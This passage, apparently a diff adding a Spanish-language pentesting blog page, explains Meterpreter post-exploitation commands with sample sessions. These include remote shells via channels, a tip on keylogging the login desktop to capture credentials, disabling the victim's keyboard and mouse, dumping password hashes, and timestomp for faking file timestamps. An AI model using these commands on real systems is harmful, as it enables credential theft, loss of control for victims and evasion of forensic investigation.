+</span></span><span class="line"><span class="cl">0.0.0.0 0.0.0.0 192.168.1.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">127.0.0.0 255.0.0.0 127.0.0.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">192.168.1.0 255.255.255.0 192.168.1.34
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">192.168.1.34 255.255.255.255 127.0.0.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">192.168.1.255 255.255.255.255 192.168.1.34
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">224.0.0.0 240.0.0.0 192.168.1.34
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">255.255.255.255 255.255.255.255 192.168.1.34
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>cd, rm, rmdir, pwd, ls, upload, download, cat edit, del, mkdir <File System Commands>
+Se trata de los comandos básicos para consulta y manipulación de ficheros, su uso es equivalente a los comandos del mismo nombre disponibles en sistemas basados en UNIX, sin embargo estos comandos se ejecutan en el sistema remoto por medio del interprete meterpreter</p>
+<p>cd: Permite navegar a través de la estructura de directorios, rm y del eliminar un fichero especificado, pwd, conocer el directorio actual en donde apunta meterpreter, upload para subir un fichero a la maquina remota, download, descargar un fichero desde la maquina remota, mkdir crear un directorio nuevo, cat Permite visualizar un fichero remoto, mientras que edit, permite editarlo con el uso de vi</p>
+<p>Como se puede apreciar, se trata de comandos de fácil uso y bastante similares a los comandos clásicos en cualquier sistema Unix.</p>
+<p>Idletime <Stdapi User Interface Commands>
+Permite determinar cuanto ha sido el tiempo en el que el usuario de la maquina remota ha permanecido sin actividad:</p>
+<p>meterpreter &gt; idletime</p>
+<p>User has been idle for: 15 mins 57 secs</p>
+<p>meterpreter &gt; idletime</p>
+<p>User has been idle for: 16 mins</p>
+<p>channel <core>, execute <Stdapi System Commands>, interact<core> read<core>, write<core>, close<core>
+Para definir diferentes procesos que se ejecuten en la maquina remota y posteriormente declararlos como canales para ser manejados por meterpreter por medio del uso del comando channel:</p>
+<p>meterpreter &gt; execute -f cmd -c</p>
+<p>Process 3356 created.</p>
+<p>Channel 11 created.</p>
+<p>meterpreter &gt; getpid</p>
+<p>Current pid: 1836</p>
+<p>meterpreter &gt; execute -f cmd -c</p>
+<p>Process 2772 created.</p>
+<p>Channel 12 created.</p>
+<p>meterpreter &gt; execute -f cmd -c</p>
+<p>Process 2860 created.</p>
+<p>Channel 13 created.</p>
+<p>Como se ha podido apreciar, se han creado diferentes canales con un proceso asociado, posteriormente es posible consultarlos con el comando channel:</p>
+<p>meterpreter &gt; channel -l</p>
+<p>Id Class Type</p>
+<p>– —– —-</p>
+<p>11 3 stdapi_process</p>
+<p>12 3 stdapi_process</p>
+<p>13 3 stdapi_process</p>
+<p>Si se desea interactuar con alguno de esto canales, se utiliza el comando “interact” para definir alguno de los canales creados y posteriormente interactuar con él.</p>
+<p>meterpreter &gt; interact 11</p>
+<p>Interacting with channel 11…</p>
+<p>Microsoft Windows XP [Version 5.1.2600]</p>
+<p>(C) Copyright 1985-2001 Microsoft Corp.</p>
+<p>c:&gt;exit</p>
+<p>meterpreter &gt; channel -l</p>
+<p>Id Class Type</p>
+<p>– —– —-</p>
+<p>12 3 stdapi_process</p>
+<p>13 3 stdapi_process</p>
+<p>Otra forma de interactuar con un canal, es utilizando los comandos read y write, que permiten enviar flujos de datos a un canal definido de una forma sencilla:</p>
+<p>meterpreter &gt; write 12</p>
+<p>Enter data followed by a ‘.’ on an empty line:</p>
+<p>echo “Hola!”</p>
+<p>.</p>
+<p>[*] Wrote 13 bytes to channel 12.</p>
+<p>meterpreter &gt; read 12</p>
+<p>Read 116 bytes from 12:</p>
+<p>Microsoft Windows XP [Version 5.1.2600]</p>
+<p>(C) Copyright 1985-2001 Microsoft Corp.</p>
+<p>c:&gt;echo “Hola!”</p>
+<p>“Hola!”</p>
+<p>Finalmente con el comando close, se cierra algún canal que se encuentre abierto</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; close 12
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Closed channel 12.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; channel -l
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Id Class Type</p>
+<p>– —– —-</p>
+<p>13 3 stdapi_process</p>
+<p>getdesktop &lt;Stdapi, User Interface Commands&gt;, enumdesktops <Stdapi User Interface Commands> setdesktop<Stdapi User Interface Commands>
+Estos comandos permiten obtener el desktop del usuario actual, establecerlo y enumerar las diferentes interfaces habilitadas en la maquina objetivo, cada uno de los desktop están asociados a una sesión (normalmente la sesión, 0 se relaciona con el usuario actualmente conectado y las demás con usuarios remotos) una estación (que normalmente es la Windows Station) y un nombre de Desktop, este nombre identifica la interfaz que se enseña al usuario, por ejemplo tenemos una para el inicio de sesión, otra para el escritorio y otra para logoff.</p>
+<p>meterpreter &gt; enumdesktops</p>
+<p>Enumerating all accessible desktops</p>
+<p>Desktops</p>
+<p>========</p>
+<p>Session Station Name</p>
+<p>——- ——- —-</p>
+<p>0 WinSta0 Default</p>
+<p>0 WinSta0 Disconnect</p>
+<p>0 WinSta0 Winlogon</p>
+<p>0 SAWinSta SADesktop</p>
+<p>Para saber en que desktop se encuentra asociada la sesión meterpreter basta con invocar el método getdesktop:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getdesktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Session 0\WinSta0\Default
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Cada uno de los desktop tiene sus propios procesos en ejecución y ademas de esto, tienen su propio buffer de teclado y dispositivos de entrada, por lo tanto cuando se realiza el monitoreo de teclas del objetivo, es necesario conocer el desktop actual de ejecución y también es necesario que el proceso del cual depende meterpreter se encuentre en ejecución para dicho desktop, por esta razón es posible que el mismo monitoreo de teclas (utilizando keyscan_*) no funcione de la misma forma para el desktop de inicio de sesión que para el escritorio de un usuario logueado.</p>
+<p>TIP: Una vez explicado lo anterior, una practica frecuente que utiliza un atacante cuando logra comprometer un sistema, es establecer después de un periodo corto de tiempo, el desktop asociado con el login de usuario y posteriormente iniciar el escaneo de teclas para dicho desktop, de esta forma es muy fácil capturar las credenciales del usuario que se esta logueando en el sistema.</p>
+<p>uictl<Stdapi User Interface Commands>, hashdump<Priv Password database Commands>, timestomp<Priv Timestomp Commands>
+el comando uictl permite habilitar/deshabilitar el ratón y el teclado de la maquina destino, de esta forma, se puede controlar las acciones que el usuario realiza.</p>
+<p>meterpreter &gt; uictl</p>
+<p>Usage: uictl [enable/disable] [keyboard/mouse]</p>
+<p>meterpreter &gt; uictl disable keyboard</p>
+<p>Disabling keyboard…</p>
+<p>meterpreter &gt; uictl enable keyboard</p>
+<p>Enabling keyboard…</p>
+<p>meterpreter &gt; uictl disable mouse</p>
+<p>Disabling mouse…</p>
+<p>meterpreter &gt; uictl enable mouse</p>
+<p>Enabling mouse…</p>
+<p>El comando hashdump permite obtener los usuarios y el hash de los passwords de la maquina remota en formato SAM, de esta forma se puede crakear la clave de un usuario determinado usando herramientas como john the ripper o ophcrack</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; hashdump
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Administrator:500:asdfghjkll1404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ASPNET:1004:f398e05bcb3llllllf92d55aff8ce62c:86ceb0fb2a9e29524943fed3ef434477:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">daniel:1007:f920b27cf8b06ac9alllllllb51404ee:c52abb1e14677d7ea228fcc1171ed7b7:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b4lllll404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HelpAssistant:1000:4d6764bf7636541b9llllll97b8f8a9d:d266eba66369591255d597bc76155cd8:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Owner:1003:cf6a21dcd4401f45f500944b531lllll5f631567587db2a3d87618c0660be3a3:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">postgres:1005:f554be491f92036e46cfff875cbe0lld:2b11a19bd88a25d3e2d07cb7cc362044:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SUPPORT_388945a0#:1002:aad3b435b51404eelld3b435b51404ee:5376b4d52202b447093e4651b63d1572:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Por otro lado con timestomp se pueden modificar los atributos relacionados con las fechas de creación y modificación de un fichero en la maquina remota.</p>
+<p>Con la siguiente instrucción se puede cambiar la fecha de creación del fichero.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; timestomp C:\AUTOEXEC.BAT -c &#34;10/10/2010 10:10:10&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Setting specific MACE attributes on C:AUTOEXEC.BAT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Con la siguiente instrucción se puede cambiar la fecha de modificación del fichero.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; timestomp C:\AUTOEXEC.BAT -m &#34;10/10/2010 10:10:10&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Setting specific MACE attributes on C:AUTOEXEC.BAT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Con la siguiente instrucción se puede cambiar la fecha de ultimo acceso del fichero.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; timestomp C:\AUTOEXEC.BAT -a &#34;10/10/2010 10:10:10&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Setting specific MACE attributes on C:AUTOEXEC.BAT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Las opciones suministradas por el comando son:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; timestomp -h
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Usage: timestomp file_path OPTIONS
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OPTIONS:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-a &lt;opt&gt; Set the “last accessed” time of the file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-b Set the MACE timestamps so that EnCase shows blanks
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-c &lt;opt&gt; Set the “creation” time of the file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-e &lt;opt&gt; Set the “mft entry modified” time of the file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-f &lt;opt&gt; Set the MACE of attributes equal to the supplied file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-h Help banner
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-m &lt;opt&gt; Set the “last written” time of the file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-r Set the MACE timestamps recursively on a directory
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-v Display the UTC MACE values of the file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-z &lt;opt&gt; Set all four attributes (MACE) of the file
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/meterpreter/">meterpreter</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/monitor/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/covers/pentesting.png" loading="lazy" data-key="monitor" data-hash="/covers/pentesting.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Meterpreter con SSH</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/comandos_basicos_sql_para_pentesting/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/covers/pentesting.png" loading="lazy" data-key="comandos_basicos_sql_para_pentesting" data-hash="/covers/pentesting.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Comandos basicos SQL para Pentesting (WIP)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/wireshark/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/covers/pentesting.png" loading="lazy" data-key="wireshark" data-hash="/covers/pentesting.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Comandos Wireshark</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/wep/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/covers/pentesting.png" loading="lazy" data-key="wep" data-hash="/covers/pentesting.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Wep</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/wpa/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/covers/pentesting.png" loading="lazy" data-key="wpa" data-hash="/covers/pentesting.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">wpa</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "procamora-github" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 #&gt; fireroot
+    </section>
+    
+    <section class="powerby">
+        
+            Esto es el footer <br/>
+        Creado con <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.13.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li>
+          <ol>
+            <li></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
